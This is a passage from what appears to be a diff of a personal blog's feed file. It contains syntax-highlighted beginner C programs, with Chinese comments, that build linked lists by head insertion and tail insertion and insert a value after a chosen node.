<span class="built_in">list</span> *p;</span><br><span class="line">	head=<span class="literal">NULL</span>;</span><br><span class="line">	</span><br><span class="line">	input();</span><br><span class="line">	<span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123; <span class="comment">//输出头插法链表数据</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot; %d &quot;</span>,p-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	</span><br><span class="line">	head = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">	<span class="keyword">while</span>(i!=<span class="number">100</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		s=(<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">		s-&gt;data=i;</span><br><span class="line">		s-&gt;next = head;  <span class="comment">//第一个数据地址为空，下一个指向前一个s；</span></span><br><span class="line">		head = s;          <span class="comment">//作为新头部；</span></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="尾插法的有序插入"><a href="#尾插法的有序插入" class="headerlink" title="尾插法的有序插入"></a>尾插法的有序插入</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">         <span class="keyword">char</span> data;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;linklist;</span><br><span class="line">  linklist *head,*tail;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   linklist *p;</span><br><span class="line">   head=tail=<span class="literal">NULL</span>;</span><br><span class="line">   input();</span><br><span class="line">   <span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>,p-&gt;data);</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">char</span> ch;</span><br><span class="line">   linklist *t;</span><br><span class="line">   ch=getchar();</span><br><span class="line">   <span class="keyword">while</span>(ch!=&amp;apos;@&amp;apos;)&#123;</span><br><span class="line">       t=(linklist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linklist));</span><br><span class="line">       t-&gt;data=ch;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;</span><br><span class="line">       head=t;</span><br><span class="line">       t-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">       tail-&gt;next=t;</span><br><span class="line">&#125;</span><br><span class="line">   tail=t;</span><br><span class="line">   tail-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">   t=(linklist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linklist));</span><br><span class="line">   ch=getchar();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<hr>
-<h3 id="插入有序链表一个数"><a href="#插入有序链表一个数" class="headerlink" title="插入有序链表一个数"></a>插入有序链表一个数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>     <span class="comment">//实现简单的有序链表插入 </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> data ;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">	</span><br><span class="line">&#125;<span class="built_in">list</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> *head,*tail;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input_inset</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">list</span> *p; </span><br><span class="line">	head=tail=<span class="literal">NULL</span>;</span><br><span class="line">	input_inset();</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123;     </span><br><span class="line">	</span><br><span class="line">	          <span class="built_in">printf</span>(<span class="string">&quot; %d &quot;</span>,p-&gt;data);         </span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input_inset</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,num;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">list</span> *t,*T,*pp;</span><br><span class="line">	t = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">	<span class="keyword">while</span>(i!=<span class="number">100</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		t-&gt;data = i;</span><br><span class="line">		<span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;  </span><br><span class="line">	</span><br><span class="line">		    head = t;     </span><br><span class="line">		    t-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> tail-&gt;next=t;</span><br><span class="line">	</span><br><span class="line">	tail = t;   </span><br><span class="line">	</span><br><span class="line">	tail-&gt;next=<span class="literal">NULL</span>;  </span><br><span class="line">	</span><br><span class="line">	t = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//插入操作 </span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入插入点的前一个数字:\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(pp=head;pp!=<span class="literal">NULL</span>;pp= pp-&gt;next)&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(pp-&gt;data==num)&#123;</span><br><span class="line">			</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;请输入要插入的数字:\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">			T = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;T-&gt;data);</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			T-&gt;next=pp-&gt;next;</span><br><span class="line">			</span><br><span class="line">			pp-&gt;next = T;</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输出插入后的链表\n&quot;</span>);	</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>多谢刘**的指导（内心抗拒）</p>
-<p>可能写的不是很完美，感谢大佬的访问~~ORZ</p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>算法与数据结构</tag>
       </tags>
   </entry>
   <entry>
